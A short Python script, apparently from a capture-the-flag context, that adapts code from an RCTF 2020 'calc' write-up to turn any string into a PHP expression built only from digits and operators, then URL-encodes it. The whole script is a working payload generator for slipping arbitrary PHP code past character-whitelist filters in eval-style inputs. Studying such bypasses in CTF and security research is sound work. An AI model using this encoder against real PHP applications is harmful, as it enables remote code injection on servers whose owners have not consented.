
import requests
import sys
import pipes
import urllib.parse

"""
============= BEGIN

The following is code adapted from @wongwaituck on github.

https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html

"""
mapping = {
    64: "(((1/0).(1)){0})&(((1/0).(1)){2})",
    48: '(0).(0){0}',
    32: "((0).(0){0})&(((1.5).(0)){1})",
    16: "(0).(0){0}",
    8: "(8).(8){0}&((1/0).(0)){0}",
    4: "(4).(4){0}&((1/0).(0)){2}",
    2: "(2).(2){0}&((1/0).(0)){1}",
    1: "(1).(1){0}&((0/0).(0)){1}"
}


idxs = [64, 48, 32, 16, 8, 4, 2, 1]

def construct_char(c):
    val = ord(c)

    payload = "("
    for idx in idxs:
        if (val >= idx):
            val -= idx
            payload += mapping[idx]
            if (val != 0):
                payload +='|'

    assert val == 0
    payload += ")"

    return payload

def construct_string(s):
    payload = "("
    for i, c in enumerate(s):
        payload += construct_char(c)
        if (i != len(s) - 1):
            payload += "."

    payload += ")"
    return payload

"""
============= END

The above is code adapted from @wongwaituck on github.

https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html

"""

if (len(sys.argv) < 2 or len(sys.argv) > 3 ):
	print("Usage: python3 bypass.py phpcode:<string> safechars:<string>")
	exit(0)

payload = construct_string(sys.argv[1])
print("=================PHP ENCODING=================")
print("PHP encoded string is:" + "\n" + payload + "\n")

if len(sys.argv) == 3:
	params = urllib.parse.quote(payload, safe=sys.argv[2])
else:
	params = urllib.parse.quote(payload)
print("=================URL ENCODING=================")
print("when urlencoded:" + "\n" + params)
